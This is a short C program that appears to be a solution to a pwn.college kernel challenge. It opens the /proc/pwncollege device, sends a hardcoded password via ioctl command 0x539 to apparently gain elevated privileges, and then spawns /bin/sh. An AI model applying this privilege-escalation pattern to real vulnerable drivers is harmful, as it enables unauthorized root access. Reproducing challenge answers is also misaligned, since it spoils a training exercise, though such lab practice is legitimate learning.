#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

char password[] = "klzipaffnucysqib";

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  ioctl(fd, 0x539, password);
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
